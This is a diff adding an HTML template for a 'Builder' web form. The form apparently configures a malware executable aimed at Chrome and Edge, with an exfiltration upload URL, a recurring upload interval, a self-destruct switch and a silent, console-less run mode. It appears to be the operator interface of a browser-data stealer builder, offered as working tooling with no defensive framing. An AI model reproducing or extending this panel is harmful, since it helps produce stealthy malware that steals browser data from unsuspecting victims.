@@ -1,0 +1,47 @@
+{% extends "base.html" %}
+{% block title %}Builder{% endblock %}
+{% block content %}
+<h1 class="text-3xl font-bold mb-4">Builder</h1>
+<form method="POST" class="space-y-4">
+    <div class="form-control">
+        <label class="label">
+            <span class="label-text">Upload URL</span>
+        </label>
+        <input type="text" name="upload_url" placeholder="http://example.com/upload" class="input input-bordered w-full" required>
+    </div>
+
+    <div class="form-control">
+        <label class="label">
+            <span class="label-text">Target Browser</span>
+        </label>
+        <select name="target_browser" class="select select-bordered w-full">
+            <option value="0">Chrome only</option>
+            <option value="1">Edge only</option>
+            <option value="2" selected>Both Chrome and Edge</option>
+        </select>
+    </div>
+
+    <div class="form-control">
+        <label class="label">
+            <span class="label-text">Upload Interval (hours, 0 for one-time)</span>
+        </label>
+        <input type="number" name="upload_interval" min="0" value="0" class="input input-bordered w-full" required>
+    </div>
+
+    <div class="form-control">
+        <label class="label cursor-pointer">
+            <span class="label-text">Enable Self-Destruct</span>
+            <input type="checkbox" name="self_destruct" class="checkbox">
+        </label>
+    </div>
+
+    <div class="form-control">
+        <label class="label cursor-pointer">
+            <span class="label-text">Run Silently (No Console)</span>
+            <input type="checkbox" name="silent" class="checkbox">
+        </label>
+    </div>
+
+    <button type="submit" class="btn btn-primary">Build Executable</button>
+</form>
+{% endblock %}
